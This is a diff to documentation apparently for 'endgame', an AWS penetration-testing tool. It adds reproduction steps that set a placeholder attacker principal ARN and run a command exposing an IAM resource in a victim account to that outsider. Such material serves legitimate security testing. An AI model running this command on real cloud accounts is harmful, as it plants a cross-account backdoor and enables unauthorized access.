@@ -2,6 +2,14 @@
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
+endgame expose --service iam --name test-resource-exposure
+```
+
 ## Example
 
 ## Exploitation
